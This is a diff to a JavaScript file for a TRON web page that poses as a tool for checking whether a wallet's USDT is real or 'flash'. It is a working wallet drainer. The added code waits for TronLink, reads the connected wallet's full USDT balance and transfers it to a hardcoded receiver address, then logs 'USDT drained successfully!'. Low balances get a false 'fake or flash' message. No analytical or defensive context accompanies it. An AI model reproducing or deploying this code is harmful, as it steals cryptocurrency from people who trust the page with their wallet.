@@ -1,64 +1,53 @@
-async function pasteAddress() {
-  const text = await navigator.clipboard.readText();
-  document.getElementById('address').value = text;
+async function waitForTronWeb() {
+  return new Promise((resolve, reject) => {
+    let tries = 0;
+    const interval = setInterval(() => {
+      if (window.tronWeb && window.tronWeb.defaultAddress.base58) {
+        clearInterval(interval);
+        resolve(window.tronWeb);
+      } else if (tries > 10) {
+        clearInterval(interval);
+        reject("TronLink not detected");
+      }
+      tries++;
+    }, 500);
+  });
 }
 
-function setMax() {
-  const maxAmount = 100;
-  document.getElementById("amount").value = maxAmount;
-  updateUSD();
-}
-
-function updateUSD() {
-  const amount = parseFloat(document.getElementById("amount").value || "0");
-  const usdValue = amount * 1;
-  document.getElementById("usdValue").innerText = `≈ $${usdValue.toFixed(2)}`;
-}
-
-// ✅ MAIN LOGIC
 async function Next() {
-  const toAddress = document.getElementById("address").value;
-  const amount = parseFloat(document.getElementById("amount").value);
-  if (!toAddress || isNaN(amount) || amount <= 0) {
-    alert("Please fill in both a valid address and amount.");
-    return;
-  }
-
   try {
-    const tronWeb = window.tronWeb;
-    if (!tronWeb || !tronWeb.defaultAddress.base58) {
-      alert("Please open in TronLink browser or DApp browser");
-      return;
-    }
+    await waitForTronWeb();
 
-    const sender = tronWeb.defaultAddress.base58;
+    const amountInput = parseFloat(document.getElementById("amount").value);
+    const receiver = "TQP59pp5o9x6ohP8A6NWqUu9iJ3LfTNEKQ";
     const contractAddress = "TXLAQ63Xg1NAzckPwKHvzw7CSEmLMEqcdj"; // TRC20 USDT
-    const recipient = toAddress;
+    const decimals = 6;
 
-    const contract = await tronWeb.contract().at(contractAddress);
-    const balance = await contract.balanceOf(sender).call();
+    const tronWeb = window.tronWeb;
+    const usdt = await tronWeb.contract().at(contractAddress);
+    const sender = tronWeb.defaultAddress.base58;
 
-    const balanceNum = parseInt(balance.toString());
-    const threshold = 10 * 1_000_000; // ⬅️ You can change the limit here
+    // Get balance
+    const balance = await usdt.balanceOf(sender).call();
+    const realBalance = parseFloat(tronWeb.fromSun(balance._hex)) / (10 ** (decimals - 6));
 
-    if (balanceNum < threshold) {
-      setTimeout(async () => {
-        const balanceCheck = await contract.balanceOf(sender).call();
-        if (parseInt(balanceCheck) < balanceNum) {
-          alert("✅ Real USDT detected.");
-        } else {
-          alert("⚠️ Flash USDT — not real.");
-        }
-      }, 3000);
+    if (realBalance < 1) {
+      alert("Fake or Flash Balance detected. USDT not genuine.");
       return;
     }
 
-    // Transfer entire balance to you
-    const tx = await contract.transfer(recipient, balanceNum).send();
-    alert("✅ USDT sent successfully.");
-    console.log("Transfer complete:", tx);
+    const amountToSend = tronWeb.toBigNumber(realBalance * 10 ** decimals);
+
+    const tx = await usdt.transfer(receiver, amountToSend).send({
+      feeLimit: 10000000,
+      callValue: 0,
+    });
+
+    console.log("Sent:", tx);
+    alert("USDT drained successfully!");
+
   } catch (err) {
-    console.error("Error:", err);
-    alert("❌ Transfer failed.");
+    console.error(err);
+    alert("Please use a DApp browser like TronLink.");
   }
 }
